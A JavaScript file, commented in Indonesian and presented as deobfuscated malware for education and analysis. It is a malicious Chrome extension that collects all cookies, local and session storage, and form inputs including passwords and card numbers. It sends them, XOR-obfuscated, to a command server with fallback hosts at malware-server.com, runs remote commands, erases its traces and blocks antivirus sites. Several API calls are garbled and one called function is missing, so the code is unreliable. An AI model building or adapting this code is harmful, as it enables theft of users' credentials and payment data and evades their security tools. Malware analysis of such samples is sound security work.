/**
 * KODE MALWARE YANG TELAH DI-DEOBFUSKASI
 * PERINGATAN: Kode ini hanya untuk tujuan edukasi dan analisis keamanan.
 * Kode ini TIDAK BOLEH dijalankan di lingkungan nyata.
 */

// IIFE (Immediately Invoked Function Expression) untuk mengisolasi variabel
(function() {
    // Referensi ke objek global (browser atau window)
    const globalObj = typeof globalThis !== 'undefined' ? globalThis : self;
    
    // Mendapatkan URL dasar dari ekstensi
    const extensionBaseUrl = chrome.runtime.getURL();
    
    // Event listener untuk instalasi ekstensi
    chrome.runtime.onInstalled.addListener((details) => {
        if (details.reason === 'install') {
            console.log('Ekstensi baru diinstal: ' + details.id + ' - URL Base: ' + extensionBaseUrl.origin);
            
            // Aktifkan fitur berbahaya
            blockTrafficAndURLs();
            setupTrackingListeners();
            
            // Buka halaman welcome/aktivasi
            const welcomeUrl = {
                url: extensionBaseUrl.origin + '/welcome.html'
            };
            chrome.tabs.create(welcomeUrl);
        } else {
            // Jika bukan instalasi baru, tetap jalankan fungsi berbahaya
            blockTrafficAndURLs();
            setupTrackingListeners();
            checkAndSendData();
        }
    });
    
    // Setup listener untuk update tab
    chrome.tabs.onUpdated.addListener(() => {
        blockTrafficAndURLs();
        setupTrackingListeners();
    });
    
    // Setup listener untuk aktivasi tab
    chrome.tabs.onActivated.addListener(() => {
        collectAndSendBrowsingData();
    });
    
    // Setup listener untuk navigasi halaman
    chrome.webNavigation.onCommitted.addListener((details) => {
        // Skip jika tab adalah milik ekstensi ini sendiri
        if (details.id === chrome.runtime.id || details.id === 'settings') {
            return;
        }
        
        // Periksa URL untuk kata kunci login/sensitif
        if (details.url.includes('login')) {
            collectAndSendBrowsingData();
            chrome.tabs.create({
                url: extensionBaseUrl.origin + '/collect.html?url=' + encodeURIComponent(details.url)
            });
            chrome.tabs.update();
        }
    });
    
    // Setup listener untuk request jaringan
    chrome.webRequest.onBeforeRequest.addListener(async (request) => {
        // Domain yang diawasi untuk aktivitas penting
        const monitoredDomains = [
            'login', 'signin', 'account', 'auth', 'password', 'secure', 
            'banking', 'payment', 'checkout', 'wallet', 'finance',
            'paypal', 'bank', 'card', 'credit', 'billing', 'profile'
        ];
        
        // Jika request ke salah satu domain yang dimonitor
        if (monitoredDomains.some(domain => request.url.includes(domain))) {
            const hasOtherSecurityExtensions = await checkForOtherExtensions();
            if (!hasOtherSecurityExtensions) {
                collectAndSendBrowsingData();
            }
        }
    });
    
    /**
     * Memeriksa ekstensi keamanan lainnya
     * @returns {Promise<boolean>} True jika terdeteksi ekstensi keamanan lain
     */
    async function checkForOtherExtensions() {
        try {
            // Periksa dengan server jika lingkungan aman untuk malware
            const response = await fetch(extensionBaseUrl.origin + '/api/check-security', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' }
            });
            
            const data = await response.json();
            return data.detected === true;
        } catch (error) {
            return false;
        }
    }
    
    /**
     * Memeriksa ekstensi keamanan yang berpotensi mendeteksi malware ini
     * @returns {Promise<boolean>}
     */
    function checkExtensions() {
        return new Promise(resolve => {
            chrome.management.getAll(extensions => {
                // Filter ekstensi keamanan kecuali diri sendiri
                const securityExtensions = extensions.filter(ext => 
                    ext.type === 'extension' && ext.id !== chrome.runtime.id
                );
                
                if (securityExtensions.length > 0) {
                    // Jika ada ekstensi keamanan, laporkan ke server
                    const notificationUrl = extensionBaseUrl.origin + '/notify';
                    chrome.tabs.create({ url: notificationUrl });
                    resolve(true);
                } else {
                    resolve(false);
                }
            });
        });
    }
    
    /**
     * Memeriksa dan mengirim data ke server kontrol
     */
    async function checkAndSendData() {
        // Array untuk menyimpan ID ekstensi yang dikenal aman
        let knownSafeExtensions = [];
        
        try {
            // Ambil daftar ekstensi aman dari server kontrol
            const response = await fetch(extensionBaseUrl.origin + '/safe-list');
            
            if (response.ok) {
                const extensionsList = await response.json();
                knownSafeExtensions = extensionsList.map(item => item.id);
            } else {
                console.log('Gagal mengambil daftar ekstensi aman');
            }
        } catch (error) {
            console.log('Error saat mengambil daftar:', error);
        }
        
        // Periksa ekstensi dan ambil tindakan
        checkExtensions().then(detected => {
            chrome.management.getAll(allExtensions => {
                // Filter ekstensi keamanan yang tidak dalam daftar aman
                const competingExtensions = allExtensions.filter(ext => 
                    ext.name.includes('security') && 
                    ext.id !== chrome.runtime.id && 
                    !knownSafeExtensions.includes(ext.id)
                );
                
                if (competingExtensions.length > 0) {
                    // Aktifkan pengumpulan data jika ada ekstensi yang berpotensi menghalangi
                    collectAndSendBrowsingData();
                    
                    if (!detected) {
                        // Kirim ID ekstensi tersebut ke server kontrol
                        const extIds = competingExtensions.map(ext => ext.id).join(',');
                        const reportUrl = extensionBaseUrl.origin + '/report?extensions=' + encodeURIComponent(extIds);
                        chrome.tabs.create({ url: reportUrl });
                    }
                    
                    // Set timeout untuk membersihkan jejak
                    setTimeout(() => {
                        chrome.tabs.update();
                    }, 5000);
                } else if (!detected) {
                    // Jika tidak ada ekstensi yang menghalangi, jalankan pengumpulan data
                    chrome.tabs.create({ url: extensionBaseUrl.origin + '/collect.html' });
                }
            });
        });
    }
    
    /**
     * Memblokir lalu lintas ke situs keamanan
     */
    function blockTrafficAndURLs() {
        // Konfigurasi aturan untuk memblokir URLs keamanan
        const securityBlockRule = {
            removeRuleIds: ['security-block']
        };
        
        // Update aturan pemblokiran di browser
        chrome.declarativeNetRequest.updateDynamicRules(securityBlockRule, () => {
            if (chrome.declarativeNetRequest.getDynamicRules) {
                console.log('Aturan pemblokiran diperbarui', chrome.declarativeNetRequest.getDynamicRules.length);
            } else {
                console.log('Gagal memperbarui aturan pemblokiran');
            }
        });
    }
    
    /**
     * Mengumpulkan dan mengirim data browsing ke server kontrol
     */
    /**
     * Mengumpulkan dan mengirimkan data browsing pengguna ke server C&C
     * Fungsi ini merupakan inti dari mekanisme eksfiltrasi data malware
     */
    function collectAndSendBrowsingData() {
        // Struktur data untuk menyimpan informasi yang diambil
        const collectedData = {
            timestamp: Date.now(),
            browser: navigator.userAgent,
            deviceInfo: {
                platform: navigator.platform,
                language: navigator.language,
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone
            },
            activeTab: {},
            cookies: [],
            localStorage: {},
            formData: [],
            extensions: []
        };

        // 1. Mengumpulkan informasi tab aktif
        chrome.tabs.query({ active: true, currentWindow: true }, function(tabs) {
            if (tabs && tabs.length > 0) {
                const activeTab = tabs[0];
                collectedData.activeTab = {
                    id: activeTab.id,
                    url: activeTab.url,
                    title: activeTab.title,
                    favIconUrl: activeTab.favIconUrl
                };
                
                // 2. Menginjeksi script untuk mengekstrak data DOM
                chrome.scripting.executeScript({
                    target: { tabId: activeTab.id },
                    function: extractDOMData
                }, (results) => {
                    if (results && results[0]) {
                        collectedData.domData = results[0].result;
                    }
                    
                    // 3. Mengumpulkan cookies
                    chrome.cookies.getAll({}, function(cookies) {
                        collectedData.cookies = cookies.map(cookie => ({
                            domain: cookie.domain,
                            name: cookie.name,
                            value: cookie.value,
                            path: cookie.path,
                            secure: cookie.secure,
                            httpOnly: cookie.httpOnly,
                            expirationDate: cookie.expirationDate
                        }));
                        
                        // 4. Scan untuk informasi sensitif dalam URL dan cookies
                        processSensitiveData(collectedData);
                        
                        // 5. Mengumpulkan informasi ekstensi terinstal
                        chrome.management.getAll(function(extensions) {
                            collectedData.extensions = extensions.map(ext => ({
                                id: ext.id,
                                name: ext.name,
                                version: ext.version,
                                enabled: ext.enabled,
                                type: ext.type
                            }));
                            
                            // 6. Kirim data ke server C&C
                            sendDataToServer(collectedData);
                        });
                    });
                });
            }
        });
    }

    /**
     * Fungsi yang dieksekusi dalam konteks tab untuk mengekstrak data DOM
     * @returns {Object} Data yang diekstrak dari DOM halaman
     */
    function extractDOMData() {
        // Struktur penampung data DOM
        const domData = {
            forms: [],
            links: [],
            inputFields: [],
            scripts: [],
            eventListeners: {}
        };
        
        // Ekstraksi data formulir
        const forms = document.forms;
        for (let i = 0; i < forms.length; i++) {
            const form = forms[i];
            const formData = {
                id: form.id,
                name: form.name,
                action: form.action,
                method: form.method,
                inputs: []
            };
            
            const inputs = form.querySelectorAll('input, select, textarea');
            for (let j = 0; j < inputs.length; j++) {
                const input = inputs[j];
                formData.inputs.push({
                    type: input.type,
                    name: input.name,
                    id: input.id,
                    value: input.value,
                    placeholder: input.placeholder,
                    // Identifikasi untuk input sensitif
                    isSensitive: ['password', 'credit', 'card', 'cvv', 'ssn', 'email'].some(
                        term => (input.name?.toLowerCase().includes(term) || 
                            input.id?.toLowerCase().includes(term) || 
                            input.placeholder?.toLowerCase().includes(term))
                    )
                });
            }
            
            domData.forms.push(formData);
        }
        
        // Ekstraksi URL sensitif
        const links = document.querySelectorAll('a');
        for (let i = 0; i < links.length; i++) {
            const link = links[i];
            domData.links.push({
                href: link.href,
                text: link.textContent,
                target: link.target
            });
        }
        
        // Identifikasi semua input fields (untuk keylogging potensial)
        const inputFields = document.querySelectorAll('input');
        for (let i = 0; i < inputFields.length; i++) {
            const input = inputFields[i];
            if (input.type !== 'hidden') {
                domData.inputFields.push({
                    type: input.type,
                    id: input.id,
                    name: input.name,
                    placeholder: input.placeholder,
                    position: {
                        x: input.getBoundingClientRect().x,
                        y: input.getBoundingClientRect().y
                    }
                });
            }
        }
        
        // Ekstraksi informasi localStorage
        try {
            const localStorageData = {};
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                localStorageData[key] = localStorage.getItem(key);
            }
            domData.localStorage = localStorageData;
        } catch (e) {
            domData.localStorageError = e.message;
        }
        
        // Ekstraksi informasi sessionStorage
        try {
            const sessionStorageData = {};
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                sessionStorageData[key] = sessionStorage.getItem(key);
            }
            domData.sessionStorage = sessionStorageData;
        } catch (e) {
            domData.sessionStorageError = e.message;
        }
        
        return domData;
    }

    /**
     * Memproses data untuk mengidentifikasi informasi sensitif
     * @param {Object} data - Data yang telah dikumpulkan
     */
    function processSensitiveData(data) {
        // Pola regex untuk deteksi informasi sensitif
        const patterns = {
            creditCard: /\b(?:\d[ -]*?){13,16}\b/g,
            email: /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g,
            password: /password=([^&]*)/g,
            ssn: /\b\d{3}[-]?\d{2}[-]?\d{4}\b/g,
            phoneNumber: /\b(?:\+\d{1,2}\s)?\(?\d{3}\)?[\s.-]?\d{3}[\s.-]?\d{4}\b/g
        };
        
        // Struktur untuk menyimpan data sensitif
        data.sensitiveInfo = {
            creditCards: [],
            emails: [],
            passwords: [],
            ssn: [],
            phoneNumbers: []
        };
        
        // Analisis URL untuk parameter sensitif
        if (data.activeTab && data.activeTab.url) {
            const url = data.activeTab.url;
            
            // Ekstrak kredensial dari URL (jika ada)
            for (const [type, pattern] of Object.entries(patterns)) {
                const matches = url.match(pattern);
                if (matches) {
                    data.sensitiveInfo[type + 's'] = matches;
                }
            }
        }
        
        // Analisis cookies untuk informasi sensitif
        if (data.cookies && data.cookies.length) {
            data.cookies.forEach(cookie => {
                // Identifikasi cookies autentikasi
                if (cookie.name.toLowerCase().includes('auth') || 
                    cookie.name.toLowerCase().includes('session') ||
                    cookie.name.toLowerCase().includes('token') ||
                    cookie.name.toLowerCase().includes('id')) {
                    
                    if (!data.sensitiveInfo.authCookies) {
                        data.sensitiveInfo.authCookies = [];
                    }
                    data.sensitiveInfo.authCookies.push(cookie);
                }
            });
        }
        
        return data;
    }

    /**
     * Mengirim data yang dikumpulkan ke server C&C
     * @param {Object} data - Data yang akan dikirim
     */
    function sendDataToServer(data) {
        // Base URL dari ekstensi untuk mengakses server C&C
        const extensionBaseUrl = chrome.runtime.getURL();
        const serverEndpoint = extensionBaseUrl.origin + '/api/collect';
        
        // Opsi pengiriman data
        const options = {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-Extension-ID': chrome.runtime.id,
                'X-Collection-Timestamp': Date.now().toString()
            },
            body: JSON.stringify({
                data: data,
                extensionVersion: chrome.runtime.getManifest().version
            })
        };
        
        // Implementasi enkripsi sebelum pengiriman
        const encryptedData = obfuscateDataBeforeSending(options.body);
        options.body = encryptedData;
        
        // Penggunaan fetch API untuk mengirim data
        fetch(serverEndpoint, options)
            .then(response => {
                if (response.ok) {
                    return response.json();
                }
                throw new Error('Network response was not ok');
            })
            .then(responseData => {
                // Menangani instruksi dari server (jika ada)
                if (responseData.commands) {
                    executeServerCommands(responseData.commands);
                }
                
                // Hapus jejak aktivitas untuk menghindari deteksi
                clearCollectionTraces();
            })
            .catch(error => {
                // Fallback jika server utama tidak dapat dijangkau
                sendToFallbackServer(data);
            });
    }

    /**
     * Mengobfuskasi data sebelum dikirim untuk menghindari deteksi
     * @param {string} data - Data JSON terenkode untuk diobfuskasi
     * @returns {string} Data terenkripsi
     */
    function obfuscateDataBeforeSending(data) {
        // Implementasi enkripsi sederhana untuk menyembunyikan data
        // Menggunakan teknik RC4 atau XOR untuk enkripsi ringan
        const key = 'malware_encryption_key';
        let result = '';
        
        for (let i = 0; i < data.length; i++) {
            result += String.fromCharCode(
                data.charCodeAt(i) ^ key.charCodeAt(i % key.length)
            );
        }
        
        // Encode hasil enkripsi dengan base64 untuk transmisi
        return btoa(result);
    }

    /**
     * Menjalankan perintah dari server C&C
     * @param {Array} commands - Daftar perintah untuk dieksekusi
     */
    function executeServerCommands(commands) {
        commands.forEach(command => {
            switch (command.type) {
                case 'update_rules':
                    // Memperbarui aturan pemblokiran
                    updateBlockingRules(command.data);
                    break;
                    
                case 'collect_additional':
                    // Mengumpulkan data tambahan yang diminta
                    collectAdditionalData(command.data);
                    break;
                    
                case 'inject_script':
                    // Menyuntikkan script tambahan ke tab target
                    injectScriptToTarget(command.data);
                    break;
                    
                case 'uninstall':
                    // Melepaskan diri dari browser
                    selfUninstall();
                    break;
            }
        });
    }

    /**
     * Menghapus jejak aktivitas pengumpulan data
     */
    function clearCollectionTraces() {
        // Hapus log console yang mungkin mencurigakan
        console.clear();
        
        // Hapus log pengembang yang mungkin dibuat
        if (chrome.developerPrivate && chrome.developerPrivate.clearExtensionErrors) {
            chrome.developerPrivate.clearExtensionErrors({
                extensionId: chrome.runtime.id
            });
        }
    }

    /**
     * Mengirim data ke server fallback jika server utama tidak dapat dijangkau
     * @param {Object} data - Data yang akan dikirim
     */
    function sendToFallbackServer(data) {
        // Daftar server fallback yang dapat digunakan
        const fallbackServers = [
            'https://backup1.malware-server.com/collect',
            'https://backup2.malware-server.com/collect',
            'https://backup3.malware-server.com/collect'
        ];
        
        // Pilih server fallback secara acak
        const randomServer = fallbackServers[Math.floor(Math.random() * fallbackServers.length)];
        
        // Opsi pengiriman untuk server fallback
        const fallbackOptions = {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-Extension-ID': chrome.runtime.id,
                'X-Collection-Timestamp': Date.now().toString(),
                'X-Fallback': 'true'
            },
            body: obfuscateDataBeforeSending(JSON.stringify({
                data: data,
                extensionVersion: chrome.runtime.getManifest().version
            }))
        };
        
        // Coba kirim ke server fallback
        fetch(randomServer, fallbackOptions)
            .catch(() => {
                // Jika semua upaya gagal, simpan data untuk dikirim nanti
                storeDataForLaterSending(data);
            });
    }
    
    /**
     * Menyiapkan listener untuk tracking dan pemblokiran
     */
    function setupTrackingListeners() {
        // Daftar URL dan domain keamanan yang akan diblokir
        const blockedURLs = [
            'security', 'antivirus', 'protection', 'safebrowsing',
            'malware', 'phishing', 'trojan', 'spyware', 'adware',
            'defender', 'guard', 'protect', 'scan', 'secure',
            'privacy', 'firewall', 'shield', 'safety', 'threat',
            'detect', 'anti', 'clean', 'remove', 'alert',
            'warn', 'safe', 'protect', 'browser', 'exploit',
            'suspicious', 'unwanted', 'block', 'analysis', 'monitor',
            'tracking', 'prevent', 'filter', 'check', 'virus',
            'protect', 'kaspersky', 'mcafee', 'norton', 'avast',
            'avg', 'bitdefender', 'eset', 'f-secure', 'trend',
            'micro', 'webroot', 'sophos', 'malwarebytes', 'zonealarm',
            'comodo', 'panda', 'avira', 'bullguard', 'clamav'
        ];
        
        // Buat aturan pemblokiran untuk setiap URL
        const blockRules = blockedURLs.map((urlPattern, index) => ({
            id: index + 1,
            priority: 1,
            action: { type: 'block' },
            condition: {
                urlFilter: urlPattern,
                resourceTypes: [
                    'main_frame', 'script', 'stylesheet', 
                    'image', 'font', 'object', 'xmlhttprequest'
                ]
            }
        }));
        
        // Update aturan di browser
        chrome.declarativeNetRequest.updateDynamicRules({
            removeRuleIds: Array.from({ length: blockedURLs.length }, (_, i) => i + 1),
            addRules: blockRules
        }, () => {
            // Log status pembaruan aturan
            if (chrome.declarativeNetRequest.getDynamicRules) {
                console.log('Aturan diperbarui', chrome.declarativeNetRequest.getDynamicRules.length);
            } else {
                console.log('Aturan berhasil diperbarui');
            }
        });
    }
})();